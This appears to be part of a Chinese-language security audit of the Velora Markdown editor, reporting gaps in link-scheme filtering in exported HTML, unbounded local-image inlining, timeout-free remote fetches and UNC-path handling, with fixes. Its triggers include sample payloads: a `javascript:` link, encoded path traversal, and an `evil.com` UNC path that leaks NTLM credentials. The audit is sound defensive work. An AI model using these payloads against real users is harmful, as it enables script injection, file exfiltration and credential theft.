## 总体结论

| 维度 | 必修 | 建议 | 存疑 | 该维度最严重的一条 |

## 维度三 · 安全

> 威胁模型：Velora 是本地桌面编辑器。真实攻击面是「打开他人发来的 `.md`」与「把导出/分享的单文件 HTML 交给收件人」——后者把文档内容固化成可分发物，是本报告安全发现的主轴。

**1.【必修】`src/export/html.rs:transform_event`（`Tag::Link` 分支）+ `rewrite_internal_anchor` — 导出 HTML 的 `<a href>` 不做协议清洗，而同一条协议在 raw HTML 那一路被拦下 — 触发：他人 `.md` 含 `[查看合同](javascript:alert(document.domain))`（也覆盖引用式 `[x][r]` + `[r]: javascript:…`、autolink `<javascript:…>`）；受害者导出单文件 HTML 并转发，收件人在浏览器里点击 — 预期 vs 实际：应与 `EXTERNAL_LINK_SCHEMES` 白名单/`has_dangerous_attrs` 同一口径，非白名单协议降级为纯文本；实际 `dest_url` 只被 `rewrite_internal_anchor` 碰过 `#` 前缀（`strip_prefix('#')` 不中就原样返回），其余直通 `html::push_html`（pulldown 的 `escape_href` 不做任何 scheme 过滤，0.13.4 已核）→ 分享物里 `<a href="javascript:…">` 点击即执行；`data:text/html`/`vbscript:` 同理。**判据其实是两份且做错了地方**：`html/parse.rs:393 has_dangerous_attrs`（含去空白 + 小写归一）只作用于原生 HTML 块，Markdown 链接这一路一处都没有；而应用内点击那路是安全的（`classify_link_target` 走 http/https/mailto/tel/ftp 白名单）——「界面正常、导出带毒」的安全变体 — 建议修法：把 `javascript:` 判定从 `has_dangerous_attrs` 抽成 `is_dangerous_url(value)` 供两路共用；Link/Image 的 dest 按 `EXTERNAL_LINK_SCHEMES` 白名单处理（`data:`/`file:`/`vbscript:` 一并降级为文本）；顺带给 `render_html_document` 的 `<head>` 加一条 CSP 兜底 — 置信度 high — 验证状态：**CONFIRMED**（四个子代理独立报同一处；主线程直查 `rewrite_internal_anchor` 与 `javascript` 全仓命中仅 `parse.rs:393` 一处，证实不对称）。`export/tests.rs` 只测了 `<script>` 块与 style 属性，链接协议零用例。可写会红测试：`export_html_downgrades_javascript_link_destination`（断言只看 `<body>` 之后）。

**2.【必修】`src/export/html.rs:local_image_data_uri` + `src/components/markdown/image.rs:resolve_image_source` — 本地图片内联不设目录边界、不设大小上限 — 触发：他人 `.md` 含 `![附件](/Users/<victim>/Desktop/内部.png)` 或 `![x](%2e%2e%2f%2e%2e%2fsecret.png)`（`percent_decode_or_raw` 在拼路径**之前**解码，编码写法照样穿越；扩展名过 `image_mime_from_path` 即可，`.tiff/.bmp` 都算）；受害者点导出并转发 — 预期 vs 实际：本地引用应限定在文档目录/工作区内，越界就不内联、保留原写法；实际 `resolve_image_source` 只做 `is_absolute()` 判定，全仓 grep 无 `canonicalize`/`starts_with(base_dir)` 一类的 containment 收口，`local_image_data_uri` 就 `fs::read(&path).ok()?` + base64 整份烘进发出去的单文件 → 窄口径信息外泄（阅读视图只是本地显示，导出才固化到分发物）；同时无尺寸闸门，单个大图直接进内存 — 建议修法：在 `resolve_image_source` 出口加一条「本地目标解析后必须落在 base_dir 之内，否则不返回 `Local`」（一处判定同时管住阅读视图与导出）；`local_image_data_uri` 加字节上限与同图缓存；失败原因走界面层 — 置信度 medium-high — 验证状态：**CONFIRMED（读码级：两个函数与缺失的 containment 检查均已核）**，未做端到端外泄实验。

**3.【必修】`src/net/mod.rs:ReqwestTransportHttpClient`（`new`/`execute_request`/`send`）— 远程图片这条网络路径没有闸门 — 触发：他人 `.md` 里 `![a](https://attacker/huge.png)`（**打开即自动加载，无需点击**），或 `https://黑洞IP/` — 预期 vs 实际：应与同目录 `net/update.rs` 一致（`connect_timeout(5s)`、`.timeout(..)`、`MAX_PACKAGE_BYTES = 512MB`、流式 64 KiB `read` 累计校验）；实际 builder 只有 `.redirect(Policy::limited(10))`，**无任何 timeout**；`response.bytes()?` 一次读全量再 `.to_vec()`，gpui 侧 `read_to_end` 又一份 → 远端可让进程内存被打穿；每个请求一个 OS 线程且无超时 → 线程与 asset future 无界累积 — 建议修法：补 `.connect_timeout`/`.timeout`；响应体按累计字节设上限（超限即 `Err`，交图片占位框）；复用 `update.rs` 那份有界下载口径 — 置信度 high — 验证状态：**CONFIRMED（主线程直查：`src/net/mod.rs` 里 `timeout`/`MAX_` 零命中，`update.rs` 三条俱全，对照成立）**。

**4.【建议】`src/export/html.rs:local_image_data_uri` + `src/editor/events/paste.rs:markdown_path_string` — 无法内联的本地绝对路径被原样写进 `<img src="/Users/<用户名>/…">`** — 触发：`ImagePasteBehavior::None` 时 Velora 自己就写绝对路径；文件已移动/删除或扩展名不在 `Img::extensions()` → `fs::read(..).ok()?` 给 `None` → `unwrap_or(dest_url)` 保留原文 — 后果：收件人从 HTML 源码读到用户名、目录层级与文档命名，同时图是坏的 — 建议修法：解析为 `Local` 但读不到时改写成不含目录信息的中性占位（或相对化引用）；失败原因走界面层 — 置信度 high（代码事实）/ 影响 medium — **未验证**。

**5.【建议】`src/editor/window_state.rs:strip_file_url_prefix`（`unwrap_or_else(|| percent_decode_or_raw(rest))` 回退）与 `resolve_image_source` — 以 `//` 开头的目标既不在 http 白名单也不带 `file:`，被当成本地路径** — 后果（Windows）：`//evil.com/share/y.png` 是 UNC 写法，`fs::read`/`exists()` 会向攻击者主机发起 SMB 会话（NTLM 凭据 + DNS 外泄），而图片是自动加载；`file_url.rs` 的文档声明「remote file authorities are rejected」，这个回退正好把被拒掉的远程 authority 还原成本地路径，等于旁路那次拒绝 — 建议修法：一处统一拒绝 `//`、`\\`、`\\?\` 开头的本地目标，并删掉回退分支的静默 re-interpret — 置信度 medium — **【存疑】：结论依赖 std/Win32 把 `//host/share` 归为 UNC，需要在 CI 的 Windows runner 上补一条断言才能定级**（子代理与主线程都未实测）。

**6.【建议】`src/config/mod.rs`（配置目录内文件权限）— `write_config_file_atomic` 按默认 umask 建文件（通常 0644）**，而同目录同级放着 `.history`、`session.json`（工作区绝对路径）、`recovery/*.json`（未保存正文全文）— 后果：同机其他本地用户可读未保存正文与路径 — 建议修法：配置目录内文件收到 0600 — 置信度 medium — **未验证**。

**7.【建议】`src/config/mod.rs` / `net/mod.rs:install_http_client` / `code_highlight.rs` — 安全相关失败的可见性**：`install_http_client` 装配失败只 `eprintln!`，界面层拿不到原因（此后所有远程图片只渲染「无法加载」占位，无人知道是客户端没装上，违反不变量 7）；`let _ = tx.send(..)` 属接收端已丢弃，可保留但要注释说明 — 建议修法：安装结果记进全局状态，首次远程图片失败时在占位框/应用内模态给出真实原因 — 置信度 medium — **CONFIRMED（读码）**。

**8.【建议】`markdown/image.rs:resolve_image_source`（`destination.starts_with("file:/")`、`scheme == "http"`）— scheme 判定大小写敏感**（详见维度一建议 6）：`![x](FILE:///tmp/a.png)` 被拼成含 `FILE:` 的相对路径，图永远加载不出而同样写法的链接能点开 — 建议修法：ASCII 小写后再判 scheme，与链接那路共用一处判定 — 置信度 high — **CONFIRMED**。

### 核实后无问题（安全面）

- **自动更新链路干净**（`src/net/update.rs` + `net/update/install.rs`）：host + scheme 白名单、跳转强制 https、`size`/`digest`/`magic` 三重校验（`MAX_PACKAGE_BYTES = 512MB`、`connect_timeout(5s)`、流式 64 KiB 累计）、macOS 走 `quoted form of (item 1 of argv)`、Windows 走 `-File` + `-LiteralPath` + JSON 配置文件，**参数全程按数据传递，未发现命令注入旁路**；semver 比较非字符串比较。

- **raw HTML 块 sanitizer**（`html/parse.rs:has_dangerous_attrs`）确实拦 `on*=` 与 `javascript:`，且做了去空白 + 小写归一；`html` 块走 `raw_fallback` 逐字保留但导出前清洗。
